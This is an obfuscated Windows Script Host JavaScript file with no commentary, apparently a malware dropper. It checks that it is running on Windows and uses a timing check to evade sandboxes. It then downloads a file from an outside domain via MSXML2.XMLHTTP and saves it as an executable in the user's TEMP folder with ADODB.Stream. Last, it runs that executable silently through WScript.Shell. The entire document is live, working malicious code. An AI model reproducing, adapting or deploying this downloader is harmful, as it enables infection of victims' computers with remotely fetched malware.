var Yt = false;
var Sj = "CreateObject";
var KL = function eG() {return WScript[Sj]("WScript.Shell");}(), AM = 11;
var Cm = "MSXML2.XMLHTTP";
var l = 2123213;
var PJ = 0;
function Gk(DI){KL["Run"](DI, PJ, PJ);};
function j(){return "" + Cm;};
function fA(c, Bf){PJ = PJ * 1; return c - Bf;};
function Qn(){return Sj;};
/*@cc_on
  @if (@_win32 || @_win64)
    Yt = true;
  @end
@*/
if (Yt)
{
var tZ = "";
function b(){return 22;};
var kJ = 0; var rA = 0;
function vF()
{
var hS = new this["Date"]();
var b0 = hS["getUTCMilliseconds"]();
WScript["Sleep"](b());
var hS = new this["Date"]();
var v = hS["getUTCMilliseconds"]();
WScript["Sleep"](b());
var hS = new this["Date"]();
var OQ = hS["getUTCMilliseconds"]();
var kJ = "W";
kJ = fA(v, b0);
var rA = "he";
rA = fA(OQ, v);
tZ = "open";
return fA(kJ, rA);
}
var IG = false;
var yT = false;
for (var Pf = PJ; Pf < b() * 1; Pf++){if (vF() != PJ){
IG = true; 
rA = "31" + 11 * kJ + rA; 
yT = true; 
break;
}}
function pf() {return ((IG == true) && (IG == yT)) ? 1 : PJ;};
if (IG && pf() && yT){
function P() {return KL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "rGTZRlANH.exe";};
 i = j();
 ZD = WScript[Sj](i);
 var n = 1;
 while (n){
try {
ZD[tZ]("GET", "http://greenellebox.com/a1odk", false);
ZD["send"]();
b1 = "Sleep";
for (;;){WScript[b1](b() * 11); if (ZD["readystate"] >= 2 * 2) break;};
n = PJ;
} catch(t){};
}
function KD(A0) {var TI = (1, 2, 3, 4, 5, A0); return TI;};
H = WScript[Qn()]("ADODB.Stream");
i = H;
i[tZ]();
i["type"] = KD(1);
i["write"](ZD["ResponseBody"]);
H["position"] = KD(PJ);
i["Save" + "ToFile"](P(), 2);
H["c"+"lose"]();
A = P();
Gk(A);
}
}

